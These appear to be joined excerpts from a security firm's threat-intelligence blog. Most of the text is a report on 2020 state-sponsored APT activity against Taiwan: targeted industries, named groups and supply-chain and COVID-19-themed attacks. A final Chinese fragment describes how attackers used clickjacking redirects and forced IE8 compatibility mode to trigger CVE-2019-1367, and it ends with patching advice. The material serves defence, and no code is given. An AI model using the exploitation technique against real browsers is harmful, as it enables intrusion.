攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend. TeamT5 has a cyber threat intelligence (CTI) centered solution, [ThreatVision](https://teamt5.org/en/products/threatvision/), and we rely on a dedicated team of security experts to keep us steps ahead of threat actors.

進行勒索攻擊的情境。\n\n![IE_9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_9_a0a080b8f8.png)\n\n![IE_10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_10_36fdab639d.png)\n\n\u003cbr\u003e\n\n我們進一步探討網站轉址狀況可以發現，攻擊者會利用免費資源網站來吸引使用者瀏覽，同時利用一透明框架覆蓋於網站上，讓使用者點擊，進而達成轉址目的。\n\n![IE_11.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_11_080a2e35e5.png)\n\n\u003cbr\u003e\n\n轉跳後的網站如下圖：\n\n\u003cbr\u003e\n\n![IE_12.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_12_9549f3a339.png)\n\n\u003cbr\u003e\n\n雖然該網站並不會植入勒索軟體，但會使用 CVE-2019-1367 弱點來植入其他的後門，另外，雖然在 IE11、IE10 和 IE9 使用 Jscript9.dll，並不受 CVE-2019-1367 漏洞的影響，但可以強制 IE 使用 IE8 兼容模式，來達成漏洞的觸發。\n\n![IE_13.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073490/IE_13_9dff2ee47b.png)\n\n![IE_14.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1626073491/IE_14_247f61ede7.png)\n\n\n## 結論\n上述案例皆為採證 IE 的連線紀錄後所發現，攻擊者透過 IE 瀏覽器的漏洞來達到攻擊目的，包含勒索或者植入其他後門程式。攻擊者透過這些弱點進行記憶體操作的攻擊，可以有效實踐無檔案式（Fileless）攻擊，以利規避一些資安產品偵測的可能性。\n\n微軟官方也預計於 2022 年 6 月 25 日，徹底終止支援 IE 瀏覽器，接下來我們也可以預期，若 IE 將來仍被發現存在重大弱點時，攻擊者可能會依循類似手法，大量進行攻擊、勒索，以達到其商業利益。\n\n## 建議\n- 建議將系統安全性更新至最新版本\n- 建議評估汰換已停止更新的作業系統與軟體\n- 非必要不使用 IE 瀏覽器\n\n## 參考資料\n[1] https://asec.ahnlab.com/en/19273/\n\n[2]
